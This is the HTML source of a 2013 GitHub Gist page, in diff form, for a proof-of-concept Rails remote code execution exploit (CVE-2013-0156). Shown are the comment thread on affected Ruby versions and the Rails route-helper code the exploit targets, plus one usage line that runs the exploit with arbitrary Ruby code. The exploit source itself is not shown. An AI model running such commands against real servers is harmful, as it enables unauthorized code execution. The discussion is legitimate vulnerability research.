+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/eric1234" class="comment-header-author">eric1234</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-716993">
+              <a href="/4499206/#comment-716993">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-716993">
+              <a href="/4499206/#comment-716993" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-11T03:33:01Z" datetime="2013-01-11T03:33:01Z">2013-01-11</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/postmodern" class="user-mention">@postmodern</a> - I figured out why your exploit did not work for me. My Rails application is running Ruby 1.9.2 which ships with Psych 1.0.0. This version of Psych is not as magical. It will serialize into arbitrary classes for Object, String and Exception. But you always got a plain Hash object from Psych until <a href="https://github.com/tenderlove/psych/issues/14">this pull request</a>. So if your app is running on Ruby 1.9.2 you are not AS vulnerable although I am sure a crafty person could come up with a similar exploit that serializes a subclass of Object, String or Exception and figures out how to execute code on that object.</p>
+
+<p>One thing I am wondering. Since all this depends on YAML serialization of ruby objects, and since Ruby 1.8.x shipped with Syck instead of Psych. Is it as vulnerable? I took a quick look at the code and I don't think it is. All objects that can be deserialized are explicity declared and there is not magic deserialization of sub-classes. Would love someone who is better with security to confirm that. If that is the case then does that means any Rails app on 1.8 is not vulnerable. I know a lot of people have moved to 1.9 but if 1.8 is safe then that significantly cuts down on the number of apps that need to be patched.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/5866464ebc16b5c4729fff4fe7d8fbe7?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-718470">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/eric1234" class="comment-header-author">eric1234</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-718470">
+              <a href="/4499206/#comment-718470">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-718470">
+              <a href="/4499206/#comment-718470" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-11T17:36:20Z" datetime="2013-01-11T17:36:20Z">2013-01-11</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>Just to followup. I did a bit more testing and Ruby 1.8 is indeed vulnerable to some of your POC scripts, but not this one for the same reason as Ruby 1.9.2. This script depends on the fact that you can unserialize any hash-like object via the ruby/hash tag. Ruby 1.9.2 and Ruby 1.8 BOTH do not allow this. You will always get back a plain Hash.</p>
+
+<p>From what I can tell your symbol DOS POC would still be effective on Ruby 1.8 and Ruby 1.9.2. Also your SQL Injection should still be effective since Arel::Nodes::SqlLiteral inherits from String. Ruby 1.8 and 1.9.2 won't allow a ruby/string to be an arbitrary class. But any subclass of String (like SqlLiteral) will work.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-719255">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-719255">
+              <a href="/4499206/#comment-719255">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-719255">
+              <a href="/4499206/#comment-719255" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-12T02:07:45Z" datetime="2013-01-12T02:07:45Z">2013-01-12</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/eric1234" class="user-mention">@eric1234</a> Excellent findings! I will update the blog post.</p>
+
+<p>I have also refactored the exploit to support both Rails 2 and 3. It turns out both Rails 2 and 3 provide a <code>ActionController::Routing::RouteSet::NamedRouteCollection</code> constant for backwards compatibility. However, the helper code that is evaluated is slightly different, so I had to require the user specify the version of Rails they wish to exploit. </p>
+
+<h3>Rails 2</h3>
+
+<pre><code>          def #{selector}(options = nil)
+            options ? #{options.inspect}.merge(options) : #{options.inspect}
+          end
+          protected :#{selector}
+</code></pre>
+
+<h3>Rails 3</h3>
+
+<pre><code>          remove_possible_method :#{selector}
+          def #{selector}(*args)
+            options = args.extract_options!
+            result = #{options.inspect}
+
+            if args.size &gt; 0
+              result[:_positional_args] = args
+              result[:_positional_keys] = #{route.segment_keys.inspect}
+            end
+
+            result.merge(options)
+          end
+          protected :#{selector}
+</code></pre>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-719277">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-719277">
+              <a href="/4499206/#comment-719277">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-719277">
+              <a href="/4499206/#comment-719277" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-12T02:29:55Z" datetime="2013-01-12T02:29:55Z">2013-01-12</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/eric1234" class="user-mention">@eric1234</a> Just installed Ruby 1.9.2-p320 and can confirm Rails 2.x and 3.x are not vulnerable to the RCE exploit.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/dcfde00ac1fae8b575b2f9b39c7e244b?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-719738">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/bsodmike" class="comment-header-author">bsodmike</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-719738">
+              <a href="/4499206/#comment-719738">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-719738">
+              <a href="/4499206/#comment-719738" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-12T10:22:22Z" datetime="2013-01-12T10:22:22Z">2013-01-12</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p>You need to correct the documentation above, as you're also specifying the param 'secret' in there; from what I can see this is not needed for this exploit although was used in the SQL (AREL) injection attack.</p>
+
+<p><code>#   $ rails_rce.rb http://localhost:3000/secrets/search "puts 'lol'" rails3</code></p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<div class="discussion-bubble js-comment-container">
+  <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <div class="discussion-bubble-content bubble">
+    <div class="discussion-bubble-inner">
+
+      <div class="comment js-comment" id="comment-721219">
+        <div class="comment-header normal-comment-header">
+          <a href="#" class="comment-type-icon mini-icon mini-icon-commit-comment"></a>
+          <a href="/postmodern" class="comment-header-author">postmodern</a>
+          <span class="comment-header-action-text">
+            <span id="gistcomment-721219">
+              <a href="/4499206/#comment-721219">commented</a></span>
+          </span>
+          <span class="comment-header-right">
+            <span id="gistcomment-721219">
+              <a href="/4499206/#comment-721219" class="comment-header-date">
+                <time class="js-relative-date" title="2013-01-13T06:10:58Z" datetime="2013-01-13T06:10:58Z">2013-01-13</time>
+              </a>
+            </span>
+          </span>
+        </div>
+
+
+        <div class="comment-content">
+          <div class="edit-comment-hide">
+            <!-- <div class="comment-form-error">There has been an error</div> -->
+            <div class="comment-body markdown-body markdown-format js-comment-body">
+                <p><a href="/bsodmike" class="user-mention">@bsodmike</a> good eyes. Fixed.</p>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+    </div>
+      <form action="/4499206/comments"
+      class="js-comment-form"
+      data-pjax-remote=replace method="post" accept-charset="UTF-8">
+  <input name="authenticity_token" type="hidden" value="O/3kfhayIVeRDs0rV1MQCTbKxmD8kJ43doCmG0Ev+zY=" />
+
+  <div class="discussion-bubble">
+    <img class="discussion-bubble-avatar" width="48" height="48" src="https://secure.gravatar.com/avatar/2d294fa145fd71d028923b2615334715?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+    <div class="discussion-bubble-content bubble">
+      <div class="discussion-bubble-inner">
+
+        <div class="js-previewable-comment-form previewable-comment-form write-selected" data-preview-url="/preview">
+          <div class="comment-form-head tabnav">
+            <ul class="js-preview-tabs tabnav-tabs">
+              <li><a href="#" class="tabnav-tab js-write-tab write-tab selected" action="write">Write</a></li>
+              <li><a href="#" class="tabnav-tab js-preview-tab preview-tab" action="preview">Preview</a></li>
+            </ul>
+            <span class="tabnav-right">
+              <span class="tabnav-widget text">
+                Comments are parsed with <a href="http://github.github.com/github-flavored-markdown/" class="gfm-help" target="_blank">GitHub Flavored Markdown</a>
+              </span>
+            </span>
+          </div>
+
+          <div class="comment-form-error" style="display: none;">There has been an error.</div>
+
+          <div class="tab-content write-content js-write-content">
+            <div class="textarea-frame">
+              <textarea name="comment[body]" placeholder="Leave a comment" class="js-comment-field js-size-to-fit"></textarea>
+            </div>
+          </div>
+
+          <div class="tab-content preview-content">
+            <div class="comment">
+              <div class="comment-header normal-comment-header">
+                <img class="comment-header-gravatar" width="22" height="22" src="https://secure.gravatar.com/avatar/2d294fa145fd71d028923b2615334715?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+                <a href="#" class="comment-header-author">andrewconner</a>
+                <span class="comment-header-action-text"><a href="#">commented</a></span>
+                <span class="comment-header-right">
+                  <a href="#" class="comment-header-date"><time>just now</time></a>
+                </span>
+              </div>
+              <div class="comment-content">
+                <div class="edit-comment-hide">
+                  <div class="comment-body markdown-body markdown-format preview-content-body js-preview-content">
+                    <p>Nothing to preview</p>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="form-actions">
+    <button class="classy primary js-comment-submit" type="submit">Add Comment</button>
+  </div>
+</form>
+
+  </div>
+</div>
+
+  <div class="context-overlay"></div>
+</div>
+
+    </div>
+    <div class="slow-loading-overlay"></div>
+  </div>
+
+  <div id="ajax-error-message" class="flash flash-error">
+    <div class="container">
+      <span class="mini-icon mini-icon-exclamation"></span>
+      Something went wrong with that request. Please try again.
+      <a href="#" class="mini-icon mini-icon-remove-close ajax-error-dismiss"></a>
+    </div>
+  </div>
+
+  <footer>
+    <div id="footer">
+  <div class="container clearfix">
+
+    <p class="right">&copy; 2013 GitHub Inc. All rights reserved.</p>
+    <a class="left" href="/">
+      <span class="mega-icon mega-icon-invertocat"></span>
+    </a>
+    <ul id="legal">
+      <li><a href="http://github.com/blog">The GitHub Blog</a></li>
+      <li><a href="mailto:support@github.com">Support</a></li>
+      <li><a href="https://github.com/contact">Contact</a></li>
+    </ul>
+
+  </div><!-- /.container -->
+</div><!-- /.#footer -->
+
+  </footer>
+
+</body>
+</html>
+
+
+  <link href="https://gist.github.com/assets/application-ca1a6454c0d217b1529b724a95888ade.css" media="screen, print" rel="stylesheet" />
+  <script src="https://gist.github.com/assets/application-7151a8ac790418fd5a6f5530eeea3234.js"></script>
+
+    <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="@github">
+  <meta name="twitter:creator" content="@postmodern">
+  <meta property="og:title" content="rails_rce.rb">
+  <meta property="og:type" content="githubog:gist">
+  <meta property="og:url" content="https://gist.github.com/4499206">
+  <meta property="og:image" content="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png">
+  <meta property="og:site_name" content="GitHub Gists">
+  <meta property="og:description" content="Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)">
+
+  <meta name="description" content="Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)">
+
+</head>
+
+<body class="logged_in">
+
+  <div id="wrapper">
+
+
+    <div id="header" class="header header-logged-in">
+      <div class="container clearfix">
+        <a class="header-logo-blacktocat" href="https://gist.github.com/">
+          <span class="mega-icon mega-icon-blacktocat"></span>
+          <span class="logo-subbrand"><img alt="GitHub:Gist" height="25" src="https://gist.github.com/assets/modules/header/logo-logged-in@4x-6a0620a1bd429fde8a2dd01fb4baef26.png"></span>
+        </a>
+        <div class="divider-vertical"></div>
+        <div class="topsearch">
+  <form id="top_search_form" action="/search" data-pjax-remote=push accept-charset="UTF-8">
+    <div class="search">
+      <input type="text" class="search js-search js-navigation-enable" name="q" placeholder="Search&#x2026;" data-hotkey="/" autocomplete=off autocorrect=off value="" >
+
+      <div class="search-results js-search-results js-navigation-container"></div>
+    </div>
+    <div class="divider-vertical"></div>
+  </form>
+  <ul class="top-nav">
+    <li class="explore"><a href="/discover/">Discover Gists</a></li>
+  </ul>
+</div>
+
+        <ul id="user-links">
+  <li>
+    <a href="/andrewconner" class="name">
+      <img src="https://secure.gravatar.com/avatar/2d294fa145fd71d028923b2615334715?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png" width="20" height="20"> andrewconner
+    </a>
+  </li>
+  <li>
+    <a href="/" id="new_gist" class="tooltipped downwards" title="Create a New Gist">
+      <span class="mini-icon mini-icon-gist-add"></span>
+    </a>
+  </li>
+  <li>
+    <a href="https://github.com" class="tooltipped downwards" title="Go to GitHub">
+      <span class="mini-icon mini-icon-octocat"></span>
+    </a>
+  </li>
+  <li>
+    <a href="https://github.com/logout" class="tooltipped downwards" id="logout" title="Log Out">
+      <span class="mini-icon mini-icon-logout"></span>
+    </a>
+  </li>
+</ul>
+
+      </div>
+    </div>
+
+    <div class="site-content" id="js-pjax-container" data-pjax-container>
+      <div class=" site-container js-site-container" data-url="/4499206">
+  <div class="pagehead repohead">
+  <div class="container">
+    <div class="title-actions-bar">
+      <ul class="pagehead-actions">
+
+        <li>
+          <li>
+              <form action="/4499206/star" data-pjax-remote=replace method="post" accept-charset="UTF-8">
+                <input name="authenticity_token" type="hidden" value="O/3kfhayIVeRDs0rV1MQCTbKxmD8kJ43doCmG0Ev+zY=" />
+                <button class="minibutton" type="submit"><span class="mini-icon mini-icon-star"></span>Star</button>
+                <a class="social-count js-social-count" href="/4499206/stars">32</a>
+              </form>
+          </li>
+          <li>
+              <form action="/4499206/fork" data-method="post" method="post" accept-charset="UTF-8">
+                <button class="minibutton fork-button" type="submit"><span class="mini-icon mini-icon-fork"></span>Fork</button>
+                <a class="social-count js-social-count" href="/4499206/forks">20</a>
+              </form>
+          </li>
+      </ul>
+      <h1 itemscope itemtype="http://data-vocabulary.org/Breadcrumb" class="entry-title public">
+        <span class="repo-label"><span>public</span></span>
+        <span class="mega-icon mega-icon-gist" ></span>
+        <div class="meta">
+          <div class="gist-author">
+            <img src="https://secure.gravatar.com/avatar/66f5d5b64b951b3eeb8b6c34fcb69237?s=140&amp;d=https://github.com/images/gravatars/gravatar-140.png" width="26" height="26">
+            <span class="author vcard">
+                <span itemprop="title"><a href="/postmodern">postmodern</a></span>
+            </span> /
+            <strong><a href="/4499206" class="js-current-repository">rails_rce.rb</a></strong>
+          </div>
+          <div class="gist-timestamp">
+              <span class="datetime">Last updated <time class="js-relative-date" title="2013-01-13T06:10:22Z" datetime="2013-01-13T06:10:22Z">2013-01-13</time></span>
+          </div>
+      </h1>
+    </div>
+
+  </div>
+</div>
+
+
+
+<div class="gist-description container">
+  <p>Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0156)</p>
+</div>
+
+<div class="gist container">
+    <div class="root-pane">
+  <div class="menu-container">
+    <ul class="menu gisttabs">
+      <li>
+        <a href="/4499206" class="selected">
+          Gist Detail
+        </a>
+      </li>
+
+        <li>
+          <a href="/4499206/revisions" >
+            Revisions
+            <span class="counter">11</span>
+          </a>
+        </li>
+
+        <li>
+          <a href="/4499206/stars" >
+            Stars
+            <span class="counter">32</span>
+          </a>
+        </li>
+
+        <li>
+          <a href="/4499206/forks" >
+            Forks
+            <span class="counter">20</span>
+          </a>
+        </li>
+    </ul>
+  </div>
+
+  <ul class="export-references">
+    <li>
+      <a href="/4499206/download" class="minibutton" rel="nofollow"><span class="mini-icon mini-icon-download"></span>Download Gist</a>
+    </li>
+    <li>
+      <label for="url-field"><strong>Clone</strong> this gist</label>
+      <input type="text" spellcheck="false" class="url-field js-url-field" name="url-field" value="https://gist.github.com/4499206.git">
+    </li>
+    <li>
+      <label for="embed-field"><strong>Embed</strong> this gist</label>
+      <input type="text" spellcheck="false" class="url-field js-url-field" name="embed-field" value="&lt;script src=&quot;https://gist.github.com/4499206.js&quot;&gt;&lt;/script&gt;">
+    </li>
+    <li>
+      <label for="link-field"><strong>Link to</strong> this gist</label>
+      <input type="text" spellcheck="false" class="url-field js-url-field" name="link-field" value="https://gist.github.com/4499206">
+    </li>
+  </ul>
+</div>
+
+
+  <div class="column files">
+        <div id="file-rails_rce-rb" class="bubble">
+          <div class="file-box ">
+            <div class="meta">
+              <div class="info">
+                <span class="icon mini-icon "></span>
+                <strong class="name">rails_rce.rb</strong>
+                <span class="language">Ruby</span>
+                <span class="size">3.56 KB</span>
+              </div>
+              <ul class="button-group actions">
+                <li><a title="Bookmark" href="#file-rails_rce-rb" class="grouped-button minibutton tooltipped downwards bookmark"><span class="mini-icon mini-icon-link"></span></a></li>
+                <li><a title="View Raw" href="/raw/4499206/1575266e471729ea8a9231ae359dd5772a6ece9c/rails_rce.rb" data-skip-pjax class="grouped-button minibutton tooltipped downwards raw-url"><span class="mini-icon mini-icon-code"></span></a></li>
+              </ul>
+            </div>
+            <div class="suppressed">
+              <a class="js-show-suppressed-file">File suppressed. Click to show.</a>
+            </div>
+
+
+
+  <div class="data">
+    <table cellpadding="0" cellspacing="0" class="lines highlight">
+      <tr>
+        <td class="line_numbers">
+          <span id="file-rails_rce-rb-L1" rel="file-rails_rce-rb-L1">1</span>
+          <span id="file-rails_rce-rb-L2" rel="file-rails_rce-rb-L2">2</span>
+          <span id="file-rails_rce-rb-L3" rel="file-rails_rce-rb-L3">3</span>
+          <span id="file-rails_rce-rb-L4" rel="file-rails_rce-rb-L4">4</span>
+          <span id="file-rails_rce-rb-L5" rel="file-rails_rce-rb-L5">5</span>
+          <span id="file-rails_rce-rb-L6" rel="file-rails_rce-rb-L6">6</span>
+          <span id="file-rails_rce-rb-L7" rel="file-rails_rce-rb-L7">7</span>
+          <span id="file-rails_rce-rb-L8" rel="file-rails_rce-rb-L8">8</span>
+          <span id="file-rails_rce-rb-L9" rel="file-rails_rce-rb-L9">9</span>
+          <span id="file-rails_rce-rb-L10" rel="file-rails_rce-rb-L10">10</span>
+          <span id="file-rails_rce-rb-L11" rel="file-rails_rce-rb-L11">11</span>
+          <span id="file-rails_rce-rb-L12" rel="file-rails_rce-rb-L12">12</span>
+          <span id="file-rails_rce-rb-L13" rel="file-rails_rce-rb-L13">13</span>
+          <span id="file-rails_rce-rb-L14" rel="file-rails_rce-rb-L14">14</span>
+          <span id="file-rails_rce-rb-L15" rel="file-rails_rce-rb-L15">15</span>
+          <span id="file-rails_rce-rb-L16" rel="file-rails_rce-rb-L16">16</span>
+          <span id="file-rails_rce-rb-L17" rel="file-rails_rce-rb-L17">17</span>
+          <span id="file-rails_rce-rb-L18" rel="file-rails_rce-rb-L18">18</span>
+          <span id="file-rails_rce-rb-L19" rel="file-rails_rce-rb-L19">19</span>
+          <span id="file-rails_rce-rb-L20" rel="file-rails_rce-rb-L20">20</span>
+          <span id="file-rails_rce-rb-L21" rel="file-rails_rce-rb-L21">21</span>
+          <span id="file-rails_rce-rb-L22" rel="file-rails_rce-rb-L22">22</span>
+          <span id="file-rails_rce-rb-L23" rel="file-rails_rce-rb-L23">23</span>
+          <span id="file-rails_rce-rb-L24" rel="file-rails_rce-rb-L24">24</span>
+          <span id="file-rails_rce-rb-L25" rel="file-rails_rce-rb-L25">25</span>
+          <span id="file-rails_rce-rb-L26" rel="file-rails_rce-rb-L26">26</span>
+          <span id="file-rails_rce-rb-L27" rel="file-rails_rce-rb-L27">27</span>
+          <span id="file-rails_rce-rb-L28" rel="file-rails_rce-rb-L28">28</span>
+          <span id="file-rails_rce-rb-L29" rel="file-rails_rce-rb-L29">29</span>
+          <span id="file-rails_rce-rb-L30" rel="file-rails_rce-rb-L30">30</span>
+          <span id="file-rails_rce-rb-L31" rel="file-rails_rce-rb-L31">31</span>
+          <span id="file-rails_rce-rb-L32" rel="file-rails_rce-rb-L32">32</span>
+          <span id="file-rails_rce-rb-L33" rel="file-rails_rce-rb-L33">33</span>
+          <span id="file-rails_rce-rb-L34" rel="file-rails_rce-rb-L34">34</span>
+          <span id="file-rails_rce-rb-L35" rel="file-rails_rce-rb-L35">35</span>
+          <span id="file-rails_rce-rb-L36" rel="file-rails_rce-rb-L36">36</span>
+          <span id="file-rails_rce-rb-L37" rel="file-rails_rce-rb-L37">37</span>
+          <span id="file-rails_rce-rb-L38" rel="file-rails_rce-rb-L38">38</span>
+          <span id="file-rails_rce-rb-L39" rel="file-rails_rce-rb-L39">39</span>
+          <span id="file-rails_rce-rb-L40" rel="file-rails_rce-rb-L40">40</span>
+          <span id="file-rails_rce-rb-L41" rel="file-rails_rce-rb-L41">41</span>
+          <span id="file-rails_rce-rb-L42" rel="file-rails_rce-rb-L42">42</span>
+          <span id="file-rails_rce-rb-L43" rel="file-rails_rce-rb-L43">43</span>
+          <span id="file-rails_rce-rb-L44" rel="file-rails_rce-rb-L44">44</span>
+          <span id="file-rails_rce-rb-L45" rel="file-rails_rce-rb-L45">45</span>
+          <span id="file-rails_rce-rb-L46" rel="file-rails_rce-rb-L46">46</span>
+          <span id="file-rails_rce-rb-L47" rel="file-rails_rce-rb-L47">47</span>
+          <span id="file-rails_rce-rb-L48" rel="file-rails_rce-rb-L48">48</span>
+          <span id="file-rails_rce-rb-L49" rel="file-rails_rce-rb-L49">49</span>
+          <span id="file-rails_rce-rb-L50" rel="file-rails_rce-rb-L50">50</span>
+          <span id="file-rails_rce-rb-L51" rel="file-rails_rce-rb-L51">51</span>
+          <span id="file-rails_rce-rb-L52" rel="file-rails_rce-rb-L52">52</span>
+          <span id="file-rails_rce-rb-L53" rel="file-rails_rce-rb-L53">53</span>
+          <span id="file-rails_rce-rb-L54" rel="file-rails_rce-rb-L54">54</span>
+          <span id="file-rails_rce-rb-L55" rel="file-rails_rce-rb-L55">55</span>
+          <span id="file-rails_rce-rb-L56" rel="file-rails_rce-rb-L56">56</span>
+          <span id="file-rails_rce-rb-L57" rel="file-rails_rce-rb-L57">57</span>
+          <span id="file-rails_rce-rb-L58" rel="file-rails_rce-rb-L58">58</span>
+          <span id="file-rails_rce-rb-L59" rel="file-rails_rce-rb-L59">59</span>
+          <span id="file-rails_rce-rb-L60" rel="file-rails_rce-rb-L60">60</span>
+          <span id="file-rails_rce-rb-L61" rel="file-rails_rce-rb-L61">61</span>
+          <span id="file-rails_rce-rb-L62" rel="file-rails_rce-rb-L62">62</span>
+          <span id="file-rails_rce-rb-L63" rel="file-rails_rce-rb-L63">63</span>
+          <span id="file-rails_rce-rb-L64" rel="file-rails_rce-rb-L64">64</span>
+          <span id="file-rails_rce-rb-L65" rel="file-rails_rce-rb-L65">65</span>
+          <span id="file-rails_rce-rb-L66" rel="file-rails_rce-rb-L66">66</span>
+          <span id="file-rails_rce-rb-L67" rel="file-rails_rce-rb-L67">67</span>
+          <span id="file-rails_rce-rb-L68" rel="file-rails_rce-rb-L68">68</span>
+          <span id="file-rails_rce-rb-L69" rel="file-rails_rce-rb-L69">69</span>
+          <span id="file-rails_rce-rb-L70" rel="file-rails_rce-rb-L70">70</span>
+          <span id="file-rails_rce-rb-L71" rel="file-rails_rce-rb-L71">71</span>
+          <span id="file-rails_rce-rb-L72" rel="file-rails_rce-rb-L72">72</span>
+          <span id="file-rails_rce-rb-L73" rel="file-rails_rce-rb-L73">73</span>
+          <span id="file-rails_rce-rb-L74" rel="file-rails_rce-rb-L74">74</span>
+          <span id="file-rails_rce-rb-L75" rel="file-rails_rce-rb-L75">75</span>
+          <span id="file-rails_rce-rb-L76" rel="file-rails_rce-rb-L76">76</span>
+          <span id="file-rails_rce-rb-L77" rel="file-rails_rce-rb-L77">77</span>
+          <span id="file-rails_rce-rb-L78" rel="file-rails_rce-rb-L78">78</span>
+          <span id="file-rails_rce-rb-L79" rel="file-rails_rce-rb-L79">79</span>
+          <span id="file-rails_rce-rb-L80" rel="file-rails_rce-rb-L80">80</span>
+          <span id="file-rails_rce-rb-L81" rel="file-rails_rce-rb-L81">81</span>
+          <span id="file-rails_rce-rb-L82" rel="file-rails_rce-rb-L82">82</span>
+          <span id="file-rails_rce-rb-L83" rel="file-rails_rce-rb-L83">83</span>
+          <span id="file-rails_rce-rb-L84" rel="file-rails_rce-rb-L84">84</span>
+          <span id="file-rails_rce-rb-L85" rel="file-rails_rce-rb-L85">85</span>
+          <span id="file-rails_rce-rb-L86" rel="file-rails_rce-rb-L86">86</span>
+          <span id="file-rails_rce-rb-L87" rel="file-rails_rce-rb-L87">87</span>
+          <span id="file-rails_rce-rb-L88" rel="file-rails_rce-rb-L88">88</span>
+          <span id="file-rails_rce-rb-L89" rel="file-rails_rce-rb-L89">89</span>
+          <span id="file-rails_rce-rb-L90" rel="file-rails_rce-rb-L90">90</span>
+          <span id="file-rails_rce-rb-L91" rel="file-rails_rce-rb-L91">91</span>
+          <span id="file-rails_rce-rb-L92" rel="file-rails_rce-rb-L92">92</span>
+          <span id="file-rails_rce-rb-L93" rel="file-rails_rce-rb-L93">93</span>
+          <span id="file-rails_rce-rb-L94" rel="file-rails_rce-rb-L94">94</span>
+          <span id="file-rails_rce-rb-L95" rel="file-rails_rce-rb-L95">95</span>
+          <span id="file-rails_rce-rb-L96" rel="file-rails_rce-rb-L96">96</span>
+          <span id="file-rails_rce-rb-L97" rel="file-rails_rce-rb-L97">97</span>
+          <span id="file-rails_rce-rb-L98" rel="file-rails_rce-rb-L98">98</span>
+          <span id="file-rails_rce-rb-L99" rel="file-rails_rce-rb-L99">99</span>
+          <span id="file-rails_rce-rb-L100" rel="file-rails_rce-rb-L100">100</span>
+          <span id="file-rails_rce-rb-L101" rel="file-rails_rce-rb-L101">101</span>
+          <span id="file-rails_rce-rb-L102" rel="file-rails_rce-rb-L102">102</span>
+          <span id="file-rails_rce-rb-L103" rel="file-rails_rce-rb-L103">103</span>
+          <span id="file-rails_rce-rb-L104" rel="file-rails_rce-rb-L104">104</span>
+          <span id="file-rails_rce-rb-L105" rel="file-rails_rce-rb-L105">105</span>
+          <span id="file-rails_rce-rb-L106" rel="file-rails_rce-rb-L106">106</span>
+          <span id="file-rails_rce-rb-L107" rel="file-rails_rce-rb-L107">107</span>
+          <span id="file-rails_rce-rb-L108" rel="file-rails_rce-rb-L108">108</span>
+          <span id="file-rails_rce-rb-L109" rel="file-rails_rce-rb-L109">109</span>
+          <span id="file-rails_rce-rb-L110" rel="file-rails_rce-rb-L110">110</span>
+          <span id="file-rails_rce-rb-L111" rel="file-rails_rce-rb-L111">111</span>
+          <span id="file-rails_rce-rb-L112" rel="file-rails_rce-rb-L112">112</span>
+          <span id="file-rails_rce-rb-L113" rel="file-rails_rce-rb-L113">113</span>
+          <span id="file-rails_rce-rb-L114" rel="file-rails_rce-rb-L114">114</span>
+          <span id="file-rails_rce-rb-L115" rel="file-rails_rce-rb-L115">115</span>
+          <span id="file-rails_rce-rb-L116" rel="file-rails_rce-rb-L116">116</span>
+          <span id="file-rails_rce-rb-L117" rel="file-rails_rce-rb-L117">117</span>
+          <span id="file-rails_rce-rb-L118" rel="file-rails_rce-rb-L118">118</span>
+          <span id="file-rails_rce-rb-L119" rel="file-rails_rce-rb-L119">119</span>
+          <span id="file-rails_rce-rb-L120" rel="file-rails_rce-rb-L120">120</span>
